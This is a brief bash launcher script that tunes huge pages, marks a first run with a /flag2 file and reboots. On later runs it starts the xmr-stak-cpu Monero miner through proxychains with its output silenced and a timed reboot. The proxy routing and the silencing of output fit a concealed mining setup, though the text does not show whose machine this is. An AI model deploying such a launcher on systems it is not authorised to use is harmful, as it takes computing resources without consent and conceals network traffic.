#!/bin/bash
sudo sysctl -w vm.nr_hugepages=128
file="/flag2"
if [ -f "$file" ]
then
	sudo chmod +x /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu	
 	sudo chmod +x /m/test01/proxychains-ng/proxychains4	
 	sudo chmod +x /m/test01/proxychains-ng/libproxychains4.so
	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
        ( sleep 10800 ; reboot ) & 
	cd /m/test01/xmr-stak-cpu/bin/
        sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
#       sudo reboot   
else
        sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
        sudo /bin/su -c "echo 'xxxxx' >> /flag2"
        sudo reboot  
fi

exit
